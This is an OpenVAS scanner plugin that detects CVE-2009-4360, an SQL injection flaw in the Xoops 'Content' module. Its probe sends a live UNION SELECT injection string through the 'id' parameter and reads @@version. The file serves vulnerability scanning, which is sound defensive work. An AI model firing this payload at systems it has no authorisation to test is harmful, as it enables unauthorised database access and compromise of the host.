###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_xoops_content_module_sql_inj_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# Xoops Content Module SQL Injection Vulnerability
#
# Authors:
# Sujit Ghosal <sghosal@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote attacker to execute arbitrary SQL
  queires to compromise the remote machine running the vulnerable application.
  Impact Level: Application";
tag_affected = "Xoops 'Content' Module 0.5";
tag_insight = "This flaw is due to improper sanitization of data inside 'Content'
  module within the 'id' parameter which lets the remote unauthenticated
  user to run arbitrary SQL Commands.";
tag_solution = "No solution or patch is available as of 24th December 2009.
  For updates refer to http://www.xoops.org/modules/repository/singlefile.php?cid=94&lid=1611";
tag_summary = "This host is running Xoops and is prone to SQL Injection
  vulnerability.";

if(description)
{
  script_id(900732);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-12-24 14:01:59 +0100 (Thu, 24 Dec 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-4360");
  script_bugtraq_id(37155);
  script_name("Xoops Content Module SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/54489");
  script_xref(name : "URL" , value : "http://securityreason.com/exploitalert/7494");
  script_xref(name : "URL" , value : "http://www.packetstormsecurity.org/0911-exploits/xoopscontent-sql.txt");

  script_description(desc);
  script_summary("Check for the version of XOOPS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

xoopsPort = get_http_port(default:80);
if(!xoopsPort){
  exit(0);
}

if(!can_host_php(port:xoopsPort)){
  exit(0);
}

if(safe_checks()){
  exit(0);
}

foreach dir (make_list("/", "/xoops", "/cms", "/content", cgi_dirs()))
{
  sndReq = http_get(item: string(dir + "/modules/content/index.php?id=1"),
                    port: xoopsPort);
  rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

  if("blockContent" >< rcvRes && "blockTitle" >< rcvRes)
  {
    request = http_get(item:dir+"/modules/content/index.php?id=-1+UNION+SELECT"+
                       "+1,2,3,@@version,5,6,7,8,9,10,11--", port:xoopsPort);
    response = http_send_recv(port:xoopsPort, data:request);

    if("Set-Cookie: " >< response && "PHPSESSID" >< response &&
                                          "path=/" >< response)
    {
      security_hole(xoopsPort);
      exit(0);
    }
  }
}
